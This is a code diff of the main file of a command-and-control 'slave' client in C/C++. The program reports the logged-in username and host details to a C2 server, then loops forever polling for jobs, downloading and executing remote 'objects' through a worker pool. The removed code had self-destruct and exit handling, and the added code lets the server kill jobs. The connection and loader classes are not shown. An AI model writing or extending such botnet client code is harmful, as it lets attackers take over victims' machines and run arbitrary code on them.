@@ -1,16 +1,14 @@
 
+
 #include "stdafx.h"
 #include "ConnectionController.h"
-#include "ObjectLoader.h"
-
-ObjectLoader* loader = new ObjectLoader();
+#include "JobHunter.h"
 
 void prepareConnection(ConnectionController* cc) {
 
     // Get username.
-    char username[30];
-    getlogin_r(username, 30);
-
+    char* username = getlogin();
+    
     // Get computer information.
     struct utsname buffer;
     if (uname(&buffer) < 0) {
@@ -26,118 +24,117 @@ void prepareConnection(ConnectionController* cc) {
     cc->prepareConnection(buffer.nodename, username, info);
 }
 
-void loop(ConnectionController* cc) {
+// int newObject(ConnectionController* cc) {
 
-    int noResponsesCount = 0;
+//     ObjectLoader* loader = new ObjectLoader();
+    
+//     if (!cc->getObject(loader)) {
+//         printf("Failed to retrieve object!\n");
+//         return RESPONSE_ERROR;
+//     }
+
+//     printf("Downloaded the object...\n");
+//     if (!loader->parseObject()) {
+//         printf("Failed to parse object!\n");
+//         return RESPONSE_ERROR;
+//     }
+
+//     printf("Object parsed, executing now...\n");
+//     int retVal = loader->executeObject();
+//     int code = cc->finishJob(retVal);
+
+//     // Cleanup object loader.
+//     loader->~ObjectLoader();
+//     return code;
+// }
+
+
+void loop(ConnectionController* cc, JobHunter jobHunter) {
+
     for (;;) {
         sleep(5);
 
-        int responseCode = cc->ping();
-        switch(responseCode) {
-            case RESPONSE_EXIT: {
-                printf("[%d] Exiting now...\n", responseCode);
-                return;
-            }
-
+        int responseCode = cc->checkNewJob();
+        switch (responseCode) {
             case RESPONSE_NEW_OBJECT: {
-                printf("\nLoading new object...\n");
                 
-                if (!cc->getNewJob(loader)) {
-                    printf("Failed to retrieve new object!\n");
-                    continue;
+                if (!jobHunter.startNewJob(cc)) {
+                    printf("Failed to start the job!\n");
                 }
 
-                // Execute job and send status to master.
-                int status = loader->run();
-                if (cc->finishJob(status) != RESPONSE_LOITER) {
-                    printf("Failed to finish job!\n");
-                    return;
-                }
                 break;
             }
 
             case RESPONSE_NOT_INIT: {
-                printf("Server didn't get our credentials, init now...\n");
-
-                int code = cc->initConnection();
+                printf("Server didn't get our credentials!\n");
+                
+                int code = cc->handShake();
                 if (code != RESPONSE_LOITER && code != RESPONSE_NEW_OBJECT) {
-                    printf("Server responded with invalid code!\n");
-                    return;
-                }
-                
-                continue;
-            }
-
-            case RESPONSE_NO_RES: {
-                
-                noResponsesCount += 1;
-                if (noResponsesCount > 10) {
-                    // Dunno the thing.
-                    printf("Self destruct or just gracefully close!\n");
+                    printf("Server gave invalid response! Exiting...\n");
                     return;
                 }
 
-                printf("No response from server?\n");
-                continue;
+                break;
             }
 
-            case RESPONSE_DESTROY: {
-                printf("[%d] Self destruction commencing...\n", responseCode);
-                return;
+            case RESPONSE_KILL_JOB: {
+
+                if (!jobHunter.killJob(cc->getJobId())) {
+                    printf("Failed to kill job %s!\n", cc->getJobId().c_str());
+                }
+
+                break;
             }
 
             case RESPONSE_PONG: {
-                printf("PONG \n");
-                continue;
+                break;
             }
 
             default: {
-                printf("An error occured! Code: %d\n", responseCode);
+                printf("Error occured! Invalid response from server: %d!\n", responseCode);
                 return;
             }
+
         }
+        jobHunter.checkAllJobs(); // Update the job list.
     }
+
 }
 
-int main(int argc, char* argv[])
-{   
-    ConnectionController *cc = new ConnectionController();
+int main(int argc, char* argv[]) 
+{
+    const char* slaveId =  SLAVE_ID;
+
+    // Check if slaveId contains Id string.
+    if (strlen(SLAVE_ID) == 0) {
+        slaveId = "FAKE_SLAVE_ID";
+    }
+
+    printf("Target C2 server: %s\n", C2HOST);
+    printf("Slave ID: %s\n", slaveId);
+
+    // Handles the connections.
+    ConnectionController *cc = new ConnectionController(slaveId);
     prepareConnection(cc);
 
-    int code = cc->initConnection();
+    JobHunter jobHunter; // Worker pool
 
-    if (code == RESPONSE_NEW_OBJECT) {
+    // First perform handshake.
+    int handshakeCode = 0;
+    if ((handshakeCode = cc->handShake()) == RESPONSE_ERROR) {
+        printf("Failed to perform handshake for initial connection!\n");
+        return false;
+    }
+    else if (handshakeCode == RESPONSE_NEW_OBJECT) {
+        printf("Getting init object.\n");
 
-        if (!cc->getNewJob(loader)) {
-            printf("Failed to retrieve init object!\n");
-            return 1;
+        // If we have an init job.
+        if (!jobHunter.startNewJob(cc)) {
+            printf("Failed to start the job!\n");
         }
-
-        // Execute job and send status to master.
-        int status = loader->run();
-        if (cc->finishJob(status) != RESPONSE_LOITER) {
-            printf("Failed to finish job!\n");
-            return 1;
-        }
-    }
-    else if (code == RESPONSE_LOITER) {
-        // Nothing.
-        printf("No init object.\n");
-    }
-    else if (code == RESPONSE_DESTROY) {
-        // Self-destruction.
-        printf("Self destruction commencing...\n");
-        return 1;
-    }
-    else if (code == RESPONSE_EXIT) {
-        printf("Exiting now...\n");
-        return 1;
-    }
-    else {
-        printf("An error occured! Code: %d\n", code);
-        return 1;
     }
 
-    loop(cc);
+    loop(cc, jobHunter); // Forever looper.
+
     return 0;
 }
